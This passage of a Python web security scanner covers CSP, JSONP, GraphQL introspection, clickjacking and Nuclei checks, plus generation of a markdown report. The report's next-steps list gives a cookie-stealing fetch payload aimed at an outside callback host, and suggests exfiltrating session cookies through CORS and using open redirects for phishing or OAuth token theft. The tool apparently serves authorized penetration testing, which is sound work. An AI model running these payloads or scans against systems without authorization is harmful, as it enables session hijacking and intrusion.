                log("warn", f"CSP [{severity}] {detail}")
                csp_findings.append({
                    "type":     "csp_weak_directive",
                    "severity": severity,
                    "keyword":  keyword,
                    "detail":   detail,
                    "csp":      csp[:300],
                })

        for pattern, detail, severity in WILDCARD_PATTERNS:
            if re.search(pattern, csp, re.IGNORECASE):
                log("warn", f"CSP [{severity}] {detail}")
                csp_findings.append({
                    "type":     "csp_wildcard",
                    "severity": severity,
                    "detail":   detail,
                    "csp":      csp[:300],
                })

    if csp_findings:
        log("good", f"CSP analysis complete — {len(csp_findings)} weaknesses")
    else:
        log("good", "CSP looks well-configured — no obvious bypasses detected")
    return csp_findings


# ── Stage 13: JSONP Endpoint Detection ───────────────────────────────────────
def check_jsonp(urls):
    log("info", "Detecting JSONP endpoints...")
    jsonp_findings = []

    CALLBACK_PARAMS = {"callback", "jsonp", "cb", "jsoncallback", "json_callback", "call"}
    probe = CANARY + "_jsonp"

    tested = set()
    with httpx.Client(timeout=8, verify=False, follow_redirects=True,
                      headers={"User-Agent": "Mozilla/5.0"}) as client:

        def _check(test_url, url, param):
            if test_url in tested:
                return
            tested.add(test_url)
            try:
                r = client.get(test_url)
                if probe + "(" in r.text:
                    log("crit", f"JSONP endpoint — '{param}' reflects unquoted at {url}")
                    jsonp_findings.append({
                        "type":     "jsonp_endpoint",
                        "severity": "HIGH",
                        "url":      url,
                        "param":    param,
                        "test_url": test_url,
                        "detail":   f"Callback param '{param}' reflected as bare function call — JSONP XSS possible",
                        "evidence": r.text[:200],
                    })
            except Exception:
                pass

        # Pass 1 — test callback params already present in crawled URLs
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                if param.lower() not in CALLBACK_PARAMS:
                    continue
                test_params = {k: (probe if k == param else v[0]) for k, v in params.items()}
                test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
                _check(test_url, url, param)

        # Pass 2 — synthetic: inject all callback params into unique base paths
        seen_paths = set()
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            path_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if path_key in seen_paths:
                continue
            seen_paths.add(path_key)
            if len(seen_paths) > 20:
                break
            for cb_param in CALLBACK_PARAMS:
                test_url = f"{path_key}?{cb_param}={probe}"
                _check(test_url, path_key, cb_param)

    log("good", f"JSONP check complete — {len(jsonp_findings)} endpoints found")
    return jsonp_findings


# ── Stage 14: GraphQL Introspection ──────────────────────────────────────────
def check_graphql(target):
    log("info", "Checking GraphQL introspection...")
    gql_findings = []

    parsed = urllib.parse.urlparse(target)
    base   = target.rstrip("/")
    root   = f"{parsed.scheme}://{parsed.netloc}"

    endpoints = list(dict.fromkeys([
        base + "/graphql", base + "/api/graphql", base + "/gql", base + "/query",
        root + "/graphql", root + "/api/graphql",
    ]))

    introspection = {"query": "{ __schema { queryType { name } types { name kind } } }"}

    with httpx.Client(timeout=10, verify=False, follow_redirects=True,
                      headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}) as client:
        for endpoint in endpoints:
            try:
                r = client.post(endpoint, json=introspection)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        schema = data.get("data", {})
                        if schema and "__schema" in str(schema):
                            types = data["data"]["__schema"].get("types", [])
                            log("crit", f"GraphQL introspection OPEN at {endpoint} — {len(types)} types")
                            gql_findings.append({
                                "type":     "graphql_introspection_enabled",
                                "severity": "MEDIUM",
                                "url":      endpoint,
                                "detail":   f"Schema fully exposed via introspection — {len(types)} types visible",
                                "evidence": str(data)[:300],
                            })
                            break
                        elif "errors" in data:
                            if "introspection" in str(data["errors"]).lower():
                                log("good", f"GraphQL at {endpoint} — introspection disabled")
                    except Exception:
                        pass
                elif r.status_code == 405:
                    r2 = client.get(endpoint, params={"query": "{ __schema { queryType { name } } }"})
                    if r2.status_code == 200 and "__schema" in r2.text:
                        log("crit", f"GraphQL introspection via GET at {endpoint}")
                        gql_findings.append({
                            "type":     "graphql_introspection_enabled",
                            "severity": "MEDIUM",
                            "url":      endpoint,
                            "detail":   "Schema exposed via GET introspection query",
                            "evidence": r2.text[:300],
                        })
                        break
            except Exception:
                continue

    if not gql_findings:
        log("info", "No accessible GraphQL endpoint or introspection disabled")
    log("good", f"GraphQL check complete — {len(gql_findings)} findings")
    return gql_findings


# ── Stage 15: Clickjacking Detection ─────────────────────────────────────────
def check_clickjacking(target):
    log("info", "Checking clickjacking protection...")
    cj_findings = []

    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:
        try:
            r = client.get(target, headers={"User-Agent": "Mozilla/5.0"})
        except Exception as e:
            log("bad", f"Clickjacking check failed: {e}")
            return cj_findings

        xfo = r.headers.get("x-frame-options", "").upper()
        csp = r.headers.get("content-security-policy", "")

        # CSP frame-ancestors takes precedence over XFO in modern browsers
        fa_match = re.search(r'frame-ancestors\s+([^;]+)', csp, re.IGNORECASE)
        frame_ancestors = fa_match.group(1).strip() if fa_match else ""

        xfo_safe = xfo in ("DENY", "SAMEORIGIN")
        fa_safe   = bool(frame_ancestors) and "*" not in frame_ancestors

        if not xfo_safe and not frame_ancestors:
            log("crit", "Clickjacking HIGH — no X-Frame-Options and no CSP frame-ancestors")
            cj_findings.append({
                "type":            "clickjacking_no_protection",
                "severity":        "HIGH",
                "detail":          "Page can be embedded in an iframe from any origin",
                "xfo":             xfo or "(absent)",
                "frame_ancestors": "(absent)",
            })
        elif xfo_safe and not frame_ancestors:
            log("warn", f"Clickjacking LOW — X-Frame-Options: {xfo} present but no CSP frame-ancestors")
            cj_findings.append({
                "type":            "clickjacking_xfo_only",
                "severity":        "LOW",
                "detail":          f"X-Frame-Options: {xfo} set but CSP frame-ancestors absent — XFO is deprecated and ignored by some browsers",
                "xfo":             xfo,
                "frame_ancestors": "(absent)",
            })
        elif "*" in frame_ancestors:
            log("crit", f"Clickjacking HIGH — CSP frame-ancestors: {frame_ancestors}")
            cj_findings.append({
                "type":            "clickjacking_wildcard_ancestors",
                "severity":        "HIGH",
                "detail":          f"CSP frame-ancestors is '{frame_ancestors}' — any origin can frame this page",
                "xfo":             xfo or "(absent)",
                "frame_ancestors": frame_ancestors,
            })
        else:
            log("good", f"Clickjacking protected — XFO: {xfo or '(absent)'}, frame-ancestors: {frame_ancestors or '(absent)'}")

    return cj_findings


# ── Stage 16: Nuclei ──────────────────────────────────────────────────────────
def run_nuclei(target, deep=False):
    log("info", "Running nuclei...")
    nuclei_findings = []

    which, _ = run("command -v nuclei 2>/dev/null")
    if not which.strip():
        log("warn", "nuclei not found — skipping (install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest)")
        return nuclei_findings

    out_file = "/tmp/nuclei_results.jsonl"
    try:
        os.remove(out_file)
    except FileNotFoundError:
        pass

    templates = "exposures/,misconfiguration/"
    if deep:
        templates += ",cves/,vulnerabilities/"

    cmd = (
        f"nuclei -u {shlex.quote(target)} "
        f"-t {templates} "
        f"-severity critical,high,medium "
        f"-silent -jsonl "
        f"-o {out_file} "
        f"2>/dev/null"
    )

    log("info", f"Nuclei templates: {templates}")
    run(cmd, timeout=300)

    try:
        with open(out_file) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    item     = json.loads(line)
                    severity = item.get("info", {}).get("severity", "info").upper()
                    name     = item.get("info", {}).get("name", "?")
                    tid      = item.get("template-id", "?")
                    matched  = item.get("matched-at", target)
                    desc     = item.get("info", {}).get("description", "")
                    log("crit" if severity == "CRITICAL" else "warn" if severity == "HIGH" else "info",
                        f"Nuclei [{severity}] {name} — {matched}")
                    nuclei_findings.append({
                        "type":        "nuclei_" + tid,
                        "severity":    severity,
                        "name":        name,
                        "template_id": tid,
                        "matched_at":  matched,
                        "detail":      desc[:200] if desc else name,
                    })
                except json.JSONDecodeError:
                    continue
    except FileNotFoundError:
        log("info", "No nuclei findings")

    crits = [f for f in nuclei_findings if f["severity"] == "CRITICAL"]
    highs = [f for f in nuclei_findings if f["severity"] == "HIGH"]
    log("good", f"Nuclei complete — {len(crits)} CRITICAL, {len(highs)} HIGH, {len(nuclei_findings)} total")
    return nuclei_findings


# ── Stage 6: Report Generation ────────────────────────────────────────────────
def generate_report(target, waf, reflected, js_findings, xss_findings, firebase_findings,
                    secret_findings, cors_findings, redirect_findings, storage_findings,
                    csp_findings, jsonp_findings, graphql_findings,
                    clickjacking_findings, nuclei_findings, output_file):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    total = len(xss_findings) + len([f for f in js_findings if f["severity"] == "HIGH"])

    lines = [
        f"# XSS Scan Report — {target}",
        f"**Date:** {ts}  ",
        f"**WAF Detected:** {waf.upper()}  ",
        f"**Reflection Points:** {len(reflected)}  ",
        f"**Confirmed XSS:** {len(xss_findings)}  ",
        f"**JS DOM Sink Issues:** {len([f for f in js_findings if f['type'] == 'dom_sink'])}  ",
        "",
        "---",
        "",
        "## Executive Summary",
        "",
    ]

    fb_crits = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
    fb_highs = [f for f in firebase_findings if f["severity"] == "HIGH"]
    confirmed_xss = [f for f in xss_findings if f["type"] == "xss_confirmed"]

    if confirmed_xss:
        lines.append(f"🔴 **{len(confirmed_xss)} confirmed XSS vulnerabilities** were found.")
    if fb_crits:
        lines.append(f"🔴 **{len(fb_crits)} CRITICAL Firebase misconfigurations** found.")
    if fb_highs:
        lines.append(f"🟠 **{len(fb_highs)} HIGH Firebase misconfigurations** found.")
    high_sinks = [f for f in js_findings if f["severity"] == "HIGH"]
    if high_sinks:
        lines.append(f"🟠 **{len(high_sinks)} HIGH-severity DOM sinks** identified in JS bundles.")
    if reflected and not confirmed_xss:
        lines.append(f"🟡 **{len(reflected)} reflection points** found but no confirmed XSS yet — manual testing recommended.")
    if not confirmed_xss and not reflected and not fb_crits:
        lines.append("🟢 No reflected XSS or confirmed DOM XSS found in automated scan.")
        lines.append("Manual testing of DOM sinks and JS bundles recommended.")

    lines += ["", "---", "", "## 1. Confirmed XSS Findings", ""]
    if xss_findings:
        for i, f in enumerate(xss_findings, 1):
            lines += [
                f"### Finding {i} — {f['type'].replace('_',' ').title()}",
                f"**Severity:** {f['severity']}  ",
                f"**Detail:** `{f['detail']}`  ",
                ""
            ]
    else:
        lines.append("No confirmed XSS from automated fuzzing. Review DOM sinks manually.")

    lines += ["", "---", "", "## 2. Reflection Points", ""]
    if reflected:
        lines.append("| Method | Parameter | URL | Context |")
        lines.append("|---|---|---|---|")
        for r in reflected:
            method = r.get("method", "GET")
            lines.append(f"| {method} | `{r['param']}` | `{r['url'][:80]}` | {r['context']} |")
    else:
        lines.append("No reflection points found.")

    lines += ["", "---", "", "## 3. JS Bundle DOM Sink Analysis", ""]
    sinks = [f for f in js_findings if f["type"] == "dom_sink"]
    sources = [f for f in js_findings if f["type"] == "dom_source"]
    maps = [f for f in js_findings if f["type"] == "source_map_exposed"]

    if maps:
        lines += ["### ⚠️ Exposed Source Maps", ""]
        for m in maps:
            lines.append(f"- `{m['url']}` — {m['detail']}")
        lines.append("")

    if sinks:
        lines += ["### Dangerous Sinks Found", ""]
        lines.append("| Severity | Sink | Bundle | Context |")
        lines.append("|---|---|---|---|")
        for s in sinks:
            bundle = s["url"].split("/")[-1][:40]
            ctx = s["context"][:60].replace("|", "\\|")
            lines.append(f"| {s['severity']} | `{s['sink']}` | `{bundle}` | `{ctx}...` |")
        lines.append("")

    if sources:
        lines += ["### DOM Sources Found", ""]
        for s in sources:
            bundle = s["url"].split("/")[-1][:40]
            lines.append(f"- `{s['source']}` in `{bundle}`")
        lines.append("")

    # Firebase section
    lines += ["", "---", "", "## 4. Firebase Misconfiguration", ""]
    if firebase_findings:
        fb_config = [f for f in firebase_findings if f["type"] == "firebase_config_exposed"]
        fb_vulns  = [f for f in firebase_findings if f["type"] != "firebase_config_exposed"]
        if fb_config:
            lines += ["### Config Found", ""]
            lines.append(f"```\n{fb_config[0]['detail']}\n```")
            lines.append("")
        if fb_vulns:
            lines += ["### Exploitable Misconfigurations", ""]
            lines.append("| Severity | Type | Detail |")
            lines.append("|---|---|---|")
            for f in fb_vulns:
                lines.append(f"| {f['severity']} | `{f['type']}` | {f['detail'][:100]} |")
            lines.append("")
            lines += ["### Evidence", ""]
            for f in fb_vulns:
                if f.get("evidence"):
                    lines.append(f"**{f['type']}:**")
                    lines.append(f"```\n{f['evidence']}\n```")
                    lines.append("")
        else:
            lines.append("Firebase config found but all security rules are properly locked.")
    else:
        lines.append("No Firebase configuration detected in JS bundles.")

    # Section 5 — Secrets
    lines += ["", "---", "", "## 5. Secrets in JS Bundles", ""]
    if secret_findings:
        lines.append("| Severity | Type | File | Preview |")
        lines.append("|---|---|---|---|")
        for s in secret_findings:
            fname = s["detail"].split(" in ")[-1] if " in " in s["detail"] else "?"
            preview = s["secret"][:30].replace("|", "\\|") + "..."
            lines.append(f"| {s['severity']} | `{s['type']}` | `{fname}` | `{preview}` |")
        lines.append("")
    else:
        lines.append("No secrets detected in JS bundles.")

    # Section 6 — CORS
    lines += ["", "---", "", "## 6. CORS Misconfiguration", ""]
    if cors_findings:
        lines.append("| Severity | Type | URL | Detail |")
        lines.append("|---|---|---|---|")
        for c in cors_findings:
            lines.append(f"| {c['severity']} | `{c['type']}` | `{c['url'][:60]}` | {c['detail']} |")
        lines.append("")
    else:
        lines.append("No CORS misconfiguration detected.")

    # Section 7 — Open Redirect
    lines += ["", "---", "", "## 7. Open Redirect", ""]
    if redirect_findings:
        lines.append("| URL | Param | Detail |")
        lines.append("|---|---|---|")
        for r in redirect_findings:
            lines.append(f"| `{r['url'][:60]}` | `{r['param']}` | {r['detail']} |")
        lines.append("")
    else:
        lines.append("No open redirects detected.")

    # Section 8 — Cloud Storage
    lines += ["", "---", "", "## 8. Cloud Storage Misconfiguration", ""]
    if storage_findings:
        lines.append("| Severity | Type | Bucket | Detail |")
        lines.append("|---|---|---|---|")
        for s in storage_findings:
            lines.append(f"| {s['severity']} | `{s['type']}` | `{s.get('bucket','?')}` | {s['detail']} |")
        lines.append("")
    else:
        lines.append("No exposed S3 or GCS buckets detected.")

    # Section 9 — CSP
    lines += ["", "---", "", "## 9. Content Security Policy", ""]
    if csp_findings:
        missing = [f for f in csp_findings if f["type"] == "csp_missing"]
        issues  = [f for f in csp_findings if f["type"] != "csp_missing"]
        if missing:
            lines.append("**Status:** No CSP header present.\n")
        if issues:
            lines.append(f"**Header (truncated):** `{issues[0]['csp'][:120]}`\n")
            lines.append("| Severity | Issue |")
            lines.append("|---|---|")
            for c in issues:
                lines.append(f"| {c['severity']} | {c['detail']} |")
        lines.append("")
    else:
        lines.append("CSP header present and no obvious bypass directives detected.")

    # Section 10 — JSONP
    lines += ["", "---", "", "## 10. JSONP Endpoints", ""]
    if jsonp_findings:
        lines.append("| URL | Param | Evidence |")
        lines.append("|---|---|---|")
        for j in jsonp_findings:
            ev = j.get("evidence", "")[:60].replace("|", "\\|")
            lines.append(f"| `{j['url'][:60]}` | `{j['param']}` | `{ev}` |")
        lines.append("")
    else:
        lines.append("No JSONP endpoints detected.")

    # Section 11 — GraphQL
    lines += ["", "---", "", "## 11. GraphQL Introspection", ""]
    if graphql_findings:
        lines.append("| URL | Detail |")
        lines.append("|---|---|")
        for g in graphql_findings:
            lines.append(f"| `{g['url']}` | {g['detail']} |")
        lines.append("")
    else:
        lines.append("No GraphQL introspection endpoint found or introspection disabled.")

    # Section 12 — Clickjacking
    lines += ["", "---", "", "## 12. Clickjacking", ""]
    if clickjacking_findings:
        for c in clickjacking_findings:
            lines += [
                f"**Severity:** {c['severity']}  ",
                f"**Detail:** {c['detail']}  ",
                f"**X-Frame-Options:** `{c['xfo']}`  ",
                f"**CSP frame-ancestors:** `{c['frame_ancestors']}`  ",
                "",
            ]
    else:
        lines.append("Clickjacking protection present and correctly configured.")

    # Section 13 — Nuclei
    lines += ["", "---", "", "## 13. Nuclei", ""]
    if nuclei_findings:
        lines.append("| Severity | Template | Finding | Matched At |")
        lines.append("|---|---|---|---|")
        for n in nuclei_findings:
            lines.append(f"| {n['severity']} | `{n['template_id']}` | {n['name']} | `{n['matched_at'][:60]}` |")
        lines.append("")
    else:
        lines.append("No findings from nuclei (exposures + misconfiguration templates).")

    lines += [
        "", "---", "",
        "## 14. Next Steps",
        "",
        "1. **Manually trace** each HIGH-severity sink to its data source",
        "2. **Test DOM sinks** with context-specific payloads from the XSS methodology PDF",
        "3. **Check reflection points** that didn't confirm — try WAF bypass variants manually",
        "4. **Review source maps** if exposed — reconstruct original source for deeper analysis",
        "5. **Test OOB callbacks** by replacing `alert(1)` with `fetch('https://your.interactsh.com/?c='+document.cookie)`",
        "6. **Firebase** — if misconfigs found, document the write/read with a screenshot for the report",
        "7. **Secrets** — rotate any exposed keys immediately; verify scope with the provider",
        "8. **CORS** — if credentials=true + origin reflected, craft a PoC that exfiltrates the session cookie",
        "9. **Open redirects** — chain with phishing or OAuth token theft for higher impact",
        "",
        "---",
        "",
        "*Generated by XSS Scanner — For authorized testing only*"
    ]

    report = "\n".join(lines)
    with open(output_file, "w") as f:
        f.write(report)
    log("good", f"Report saved → {output_file}")
    return report


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="XSS Scanner — Automated discovery + WAF bypass"
    )
    parser.add_argument("-u", "--url",    required=True, help="Target URL (authorized targets only)")
    parser.add_argument("--oob",          default=None,  help="OOB callback URL (interactsh/canarytokens)")
    parser.add_argument("--depth",        default=3,     type=int, help="Crawl depth (default: 3)")
    parser.add_argument("--report",       default=None,  help="Output report file (default: xss_report_<domain>.md)")
    parser.add_argument("--deep",         action="store_true", help="Deep scan — more payloads, slower")
    parser.add_argument("--skip-crawl",   action="store_true", help="Skip crawling, only fuzz the given URL")
    parser.add_argument("--skip-js",      action="store_true", help="Skip JS bundle analysis")
    args = parser.parse_args()

    target = args.url.rstrip("/")
    domain = urllib.parse.urlparse(target).netloc.replace(".", "_")
    report_file = args.report or f"xss_report_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"

    log("info", f"Target: {BO}{target}{RE}")
    log("info", f"Report: {report_file}")
    if args.oob:
        log("info", f"OOB callback: {args.oob}")

    start = time.time()

    # Stage 1 — WAF detection
    waf = detect_waf(target)

    # Stage 2 — Crawl
    if args.skip_crawl:
        urls = [target]
        log("warn", "Skipping crawl — only scanning target URL")
    else:
        urls = crawl(target, depth=args.depth)
        if not urls:
            log("warn", "No URLs discovered by katana — falling back to target URL only")
            urls = [target]

    # Stage 3 — Canary injection
    reflected = inject_canary(urls)

    # Stage 4 — JS bundle analysis
    js_findings = []
    if not args.skip_js:
        js_findings = analyze_js_bundles(target)

    # Stage 5 — Dalfox fuzzing
    xss_findings = fuzz_with_dalfox(target, waf, oob=args.oob, reflected=reflected)

    # Stage 7 — Firebase misconfiguration check
    firebase_findings = []
    if not args.skip_js:
        firebase_findings = check_firebase(js_findings)

    # Stage 8 — Secrets in JS bundles
    secret_findings = []
    if not args.skip_js:
        secret_findings = detect_secrets()

    # Stage 9 — CORS misconfiguration
    cors_findings = check_cors(target)

    # Stage 10 — Open redirect
    redirect_findings = check_open_redirect(urls)

    # Stage 11 — Cloud storage (S3 / GCS)
    storage_findings = []
    if not args.skip_js:
        storage_findings = check_cloud_storage()

    # Stage 12 — CSP analysis
    csp_findings = analyze_csp(target)

    # Stage 13 — JSONP endpoints
    jsonp_findings = check_jsonp(urls)

    # Stage 14 — GraphQL introspection
    graphql_findings = check_graphql(target)

    # Stage 15 — Clickjacking
    clickjacking_findings = check_clickjacking(target)

    # Stage 16 — Nuclei
    nuclei_findings = run_nuclei(target, deep=args.deep)

    # Stage 6 — Report
    elapsed = round(time.time() - start, 1)
    log("good", f"Scan complete in {elapsed}s")
    print()
    confirmed      = [f for f in xss_findings if f["type"] == "xss_confirmed"]
    unverified     = [f for f in xss_findings if f["type"] == "xss_poc_unverified"]
    fb_crits       = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
    fb_highs       = [f for f in firebase_findings if f["severity"] == "HIGH"]
    sec_crits      = [f for f in secret_findings if f["severity"] == "CRITICAL"]
    cors_crits     = [f for f in cors_findings if f["severity"] == "CRITICAL"]
    nuc_crits      = [f for f in nuclei_findings if f["severity"] == "CRITICAL"]
    nuc_highs      = [f for f in nuclei_findings if f["severity"] == "HIGH"]
    print(f"{BO}{'='*60}{RE}")
    print(f"  {R}XSS Confirmed:   {len(confirmed)} (browser-verified){RE}")
    print(f"  {Y}XSS PoC:         {len(unverified)} (needs manual verify){RE}")
    print(f"  {Y}Reflection pts:  {len(reflected)}{RE}")
    print(f"  {Y}DOM Sinks:       {len([f for f in js_findings if f['type']=='dom_sink'])}{RE}")
    print(f"  {R}Secrets:         {len(secret_findings)} ({len(sec_crits)} CRITICAL){RE}")
    print(f"  {R}CORS:            {len(cors_findings)} ({len(cors_crits)} CRITICAL){RE}")
    print(f"  {R}Open Redirects:  {len(redirect_findings)}{RE}")
    print(f"  {Y}Cloud Storage:   {len(storage_findings)}{RE}")
    print(f"  {Y}CSP Issues:      {len(csp_findings)}{RE}")
    print(f"  {Y}JSONP Endpoints: {len(jsonp_findings)}{RE}")
    print(f"  {Y}GraphQL:         {len(graphql_findings)}{RE}")
    print(f"  {Y}Clickjacking:    {len(clickjacking_findings)}{RE}")
    print(f"  {R}Nuclei:          {len(nuclei_findings)} ({len(nuc_crits)} CRIT / {len(nuc_highs)} HIGH){RE}")
    print(f"  {R}Firebase Crit:   {len(fb_crits)}{RE}")
    print(f"  {Y}Firebase High:   {len(fb_highs)}{RE}")
    print(f"  {B}WAF:             {waf.upper()}{RE}")
    print(f"{BO}{'='*60}{RE}")
    print()

    generate_report(
        target, waf, reflected, js_findings, xss_findings, firebase_findings,
        secret_findings, cors_findings, redirect_findings, storage_findings,
        csp_findings, jsonp_findings, graphql_findings,
        clickjacking_findings, nuclei_findings, report_file
    )


if __name__ == "__main__":
    main()
